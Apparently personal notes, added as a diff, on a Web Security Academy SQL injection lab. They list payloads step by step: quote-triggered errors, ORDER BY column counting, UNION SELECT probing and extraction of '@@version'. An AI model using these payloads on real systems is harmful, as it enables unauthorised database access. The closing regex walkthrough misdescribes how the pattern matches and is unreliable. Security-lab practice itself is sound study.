@@ -1,0 +1,30 @@
+Lab 4
+1. access the gift category filter
+https://0a60004904c360f582465735005e00d2.web-security-academy.net/filter?category=Gifts
+
+2. Use ' to generate an internal error
+https://0a60004904c360f582465735005e00d2.web-security-academy.net/filter?category=Gifts'
+
+3. Determine number of column
+' ORDER BY 1#
+GET /filter?category=Gifts'+ORDER+BY+2%23
+
+=>' UNION SELECT NULL#
+GET /filter?category=Gifts'+UNION+SELECT+'CTFSEC','CTFSEC2'%23
+
+Getting the version
+'+UNION+SELECT+@@version,NULL%23
+
+Now, let's put it all together:
+
+\d+.\d+.\d+.\d+ubuntu.* matches the entire version number "8.0.36-0ubuntu0.20.04.1".
+It matches:
+"8" with \d+.
+".0" with the dot ..
+"36" with \d+.
+"-0" with the dot ..
+"ubuntu" literally.
+"0.20.04.1" with .*.
+
+
+(\d+.){3}\d+[a-z]{6}(\d+.){4}
